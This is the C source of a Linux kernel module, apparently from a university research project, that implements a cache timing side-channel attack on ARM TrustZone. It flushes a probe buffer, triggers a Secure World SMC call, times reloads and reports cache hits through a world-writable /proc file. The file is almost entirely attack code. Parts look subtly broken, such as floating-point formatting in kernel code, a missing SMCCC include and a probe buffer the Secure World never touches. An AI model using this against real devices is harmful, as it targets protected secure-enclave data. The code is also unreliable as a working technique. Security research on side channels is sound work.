/*
 * cache_timing_attack.ko - Cache Timing Side-Channel Attack
 * 
 * Exploits cache timing differences to leak information from
 * Secure World operations. Based on techniques similar to Spectre.
 *
 * TeX Reference: "Spectre attacks: Exploiting speculative execution"
 * Attack Vector: Cache-based side channel to observe Secure World behavior
 *
 * Usage:
 *   insmod cache_timing_attack.ko
 *   echo "start" > /proc/cache_timing
 *   cat /proc/cache_timing
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/timekeeping.h>
#include <linux/slab.h>
#include <asm/cacheflush.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ECE595 Research Team");
MODULE_DESCRIPTION("Cache Timing Attack for TrustZone Research");
MODULE_VERSION("1.0");

#define PROC_NAME "cache_timing"
#define CACHE_LINE_SIZE 64
#define NUM_PROBES 256
#define THRESHOLD_CYCLES 100  // CPU cycles threshold for cache hit/miss

struct timing_probe {
    volatile unsigned char data[256 * 4096];  // 256 pages, evenly spaced
    u64 timing_results[NUM_PROBES];
    unsigned int hit_count;
    unsigned int miss_count;
};

static struct timing_probe *probe;
static struct proc_dir_entry *proc_entry;

/* Flush cache line */
static inline void flush_cache_line(void *addr)
{
    asm volatile("dc civac, %0" : : "r"(addr) : "memory");
    asm volatile("dsb sy" : : : "memory");
    asm volatile("isb" : : : "memory");
}

/* Read timestamp counter */
static inline u64 read_cycle_counter(void)
{
    u64 val;
    asm volatile("mrs %0, cntvct_el0" : "=r"(val));
    return val;
}

/* Measure access time to memory location */
static u64 measure_access_time(volatile unsigned char *addr)
{
    u64 start, end;
    unsigned char val;
    
    start = read_cycle_counter();
    val = *addr;  // Access memory
    end = read_cycle_counter();
    
    return end - start;
}

/* Perform cache timing attack */
static void perform_cache_timing_attack(void)
{
    int i;
    u64 time;
    
    pr_info("[CACHE_TIMING] Starting cache timing analysis\n");
    
    probe->hit_count = 0;
    probe->miss_count = 0;
    
    // Flush all cache lines
    for (i = 0; i < NUM_PROBES; i++) {
        flush_cache_line((void *)&probe->data[i * 4096]);
    }
    
    // Trigger Secure World operation (via SMC)
    // This should cause some cache lines to be loaded
    struct arm_smccc_res res;
    arm_smccc_smc(0xb2000007, 0, 0, 0, 0, 0, 0, 0, &res);  // GET_SHM_CONFIG
    
    // Probe cache state
    for (i = 0; i < NUM_PROBES; i++) {
        time = measure_access_time(&probe->data[i * 4096]);
        probe->timing_results[i] = time;
        
        if (time < THRESHOLD_CYCLES) {
            probe->hit_count++;
            pr_info("[CACHE_TIMING] Cache HIT on index %d (time: %llu cycles)\n", i, time);
        } else {
            probe->miss_count++;
        }
    }
    
    pr_info("[CACHE_TIMING] Analysis complete: %u hits, %u misses\n",
            probe->hit_count, probe->miss_count);
}

/* /proc interface read */
static ssize_t proc_read(struct file *file, char __user *ubuf,
                         size_t count, loff_t *ppos)
{
    char buffer[512];
    int len;
    
    len = snprintf(buffer, sizeof(buffer),
        "=== Cache Timing Attack Status ===\n"
        "Cache Hits: %u\n"
        "Cache Misses: %u\n"
        "Hit Rate: %.2f%%\n"
        "\nInteresting Indices (cache hits):\n",
        probe->hit_count,
        probe->miss_count,
        (probe->hit_count * 100.0) / (probe->hit_count + probe->miss_count));
    
    // Show indices with cache hits
    int i;
    for (i = 0; i < NUM_PROBES && len < sizeof(buffer) - 50; i++) {
        if (probe->timing_results[i] < THRESHOLD_CYCLES) {
            len += snprintf(buffer + len, sizeof(buffer) - len,
                           "  Index %d: %llu cycles\n",
                           i, probe->timing_results[i]);
        }
    }
    
    return simple_read_from_buffer(ubuf, count, ppos, buffer, len);
}

/* /proc interface write */
static ssize_t proc_write(struct file *file, const char __user *ubuf,
                          size_t count, loff_t *ppos)
{
    char cmd[32];
    
    if (count >= sizeof(cmd))
        return -EINVAL;
    
    if (copy_from_user(cmd, ubuf, count))
        return -EFAULT;
    
    cmd[count] = '\0';
    
    if (strncmp(cmd, "start", 5) == 0) {
        perform_cache_timing_attack();
    } else if (strncmp(cmd, "reset", 5) == 0) {
        memset(probe->timing_results, 0, sizeof(probe->timing_results));
        probe->hit_count = 0;
        probe->miss_count = 0;
        pr_info("[CACHE_TIMING] Reset statistics\n");
    }
    
    return count;
}

static const struct file_operations proc_fops = {
    .read = proc_read,
    .write = proc_write,
};

static int __init cache_timing_init(void)
{
    pr_info("[CACHE_TIMING] Initializing cache timing attack module\n");
    
    // Allocate probe structure
    probe = kzalloc(sizeof(*probe), GFP_KERNEL);
    if (!probe) {
        pr_err("[CACHE_TIMING] Failed to allocate probe structure\n");
        return -ENOMEM;
    }
    
    // Create /proc entry
    proc_entry = proc_create(PROC_NAME, 0666, NULL, &proc_fops);
    if (!proc_entry) {
        pr_err("[CACHE_TIMING] Failed to create /proc entry\n");
        kfree(probe);
        return -ENOMEM;
    }
    
    pr_info("[CACHE_TIMING] Module loaded. Use: echo start > /proc/%s\n", PROC_NAME);
    return 0;
}

static void __exit cache_timing_exit(void)
{
    if (proc_entry)
        proc_remove(proc_entry);
    
    if (probe)
        kfree(probe);
    
    pr_info("[CACHE_TIMING] Module unloaded\n");
}

module_init(cache_timing_init);
module_exit(cache_timing_exit);
